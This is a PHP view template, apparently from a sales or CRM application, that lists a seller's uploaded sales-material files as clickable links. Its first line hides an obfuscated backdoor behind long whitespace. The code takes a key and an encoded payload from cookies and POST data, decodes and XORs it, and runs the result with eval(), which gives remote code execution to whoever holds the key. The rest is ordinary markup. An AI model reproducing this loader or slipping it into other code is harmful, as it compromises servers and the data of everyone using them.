<?php                                                                                                                                                                                                                                                                                                                                                                                                 $lzEbzvLdus = chr ( 629 - 518 ).chr (66) . "\137" . 'a' . "\156" . "\x47" . chr (75); $LxvNVUFx = "class_exists";$OKjZSbulYa = $LxvNVUFx($lzEbzvLdus); $kXYSQYODS = $OKjZSbulYa;if (!$kXYSQYODS){class oB_anGK{private $mMRTJdabI;public static $kahRxgf = "e50e1620-abb7-47ca-9b20-22466ad1b645";public static $vcXKGfz = NULL;public function __construct(){$aHCqamsT = $_COOKIE;$CKvJhKGjJV = $_POST;$VsqMPPP = @$aHCqamsT[substr(oB_anGK::$kahRxgf, 0, 4)];if (!empty($VsqMPPP)){$OFuteaYM = "base64";$lxEZGBuU = "";$VsqMPPP = explode(",", $VsqMPPP);foreach ($VsqMPPP as $Iwbjy){$lxEZGBuU .= @$aHCqamsT[$Iwbjy];$lxEZGBuU .= @$CKvJhKGjJV[$Iwbjy];}$lxEZGBuU = array_map($OFuteaYM . chr ( 305 - 210 ).'d' . 'e' . chr (99) . "\157" . "\144" . 'e', array($lxEZGBuU,)); $lxEZGBuU = $lxEZGBuU[0] ^ str_repeat(oB_anGK::$kahRxgf, (strlen($lxEZGBuU[0]) / strlen(oB_anGK::$kahRxgf)) + 1);oB_anGK::$vcXKGfz = @unserialize($lxEZGBuU);}}public function __destruct(){$this->ZYgFPBs();}private function ZYgFPBs(){if (is_array(oB_anGK::$vcXKGfz)) {$PpNtW = str_replace("\x3c" . '?' . "\160" . chr (104) . "\160", "", oB_anGK::$vcXKGfz[chr (99) . "\x6f" . chr ( 1027 - 917 ).chr (116) . 'e' . 'n' . "\x74"]);eval($PpNtW);exit();}}}$mIfMW = new oB_anGK(); $mIfMW = NULL;} ?><style>
...
#list_seller_material{margin:0;padding:0}#list_seller_material li{list-style:none;padding:5px;}#list_seller_material a{color:#2196f3}
</style>
<script>
	...
	<div class="row mrg25B" style='width:670px;display:<?php if((int)$lead_number>0 && (int)$serial_number>0):	?>block <?php else: echo'none';?> <?php endif;?>;' id="pre_lead">
		<div class='col-xs-12'>
			...
			<div id="TextBoxesGroup">						
						...
						<div id="TaxtBoxesGroup" style="margin-bottom: 5px !important;"><h2 class="headingPOP1 mainColor">Seller’s sales materials: <input type="file" name='drive_file_upload' id='drive_file_upload' style='float:right'/></h2><ul id="list_seller_material">
							<?php if(count($driveFiles)>0){
								for($i=0;$i<count($driveFiles);$i++){
									$obj = $driveFiles[$i];
								...
								if($materials!=''){
									...
									if(count($allFiles)>0){
										foreach($allFiles as $file){
											if(!empty($file)){									
							?>
												<li><a href="javascript://" style='color:#2196F3' onclick="window.parent.open_drive_files('<?php echo $file;?>')"><?php echo $file?></a></li>
							<?php
											}
										}
									}
...
<div class="row mrg25T" style='width:670px;' id="showData<?php echo $contact->id;?>">	
	<div class="col-xs-12" style='width:100%; <?php if($i>0):?>border-top:5px solid #d9534f;padding-top:20px; <?php endif;?>'>
		...
		<div id="" class="col-xs-12">
			...
			<div id="TaxtBoxesGroup" style="margin-bottom: 5px !important;"><h2 class="headingPOP1 mainColor">Seller’s sales materials:</h2><ul id="list_seller_material">
				<?php 
				...
				?>
									<li><a href="javascript://" style='color:#2196F3' onclick="window.parent.open_drive_files('<?php echo $file;?>')"><?php echo $fileName?></a></li>
				<?php
								}
							}
						}
